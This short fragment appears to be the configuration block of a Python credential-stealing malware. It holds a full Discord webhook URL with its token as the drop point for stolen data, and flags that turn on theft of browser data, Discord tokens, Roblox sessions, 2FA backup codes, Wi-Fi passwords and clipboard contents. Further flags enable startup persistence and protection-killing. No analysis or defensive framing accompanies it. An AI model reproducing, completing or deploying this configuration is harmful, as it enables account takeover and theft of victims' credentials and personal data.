...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1227870987043999754/5T1svjLHv0K-vnqB1PH5c2ubPw6BhubglpP5f6c6cmkA2EBL-qI6ULejHJY4v8yhk8PN', 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': True, 'defender': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': True, 'killprotector': True, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': False, 'clipboard': True}
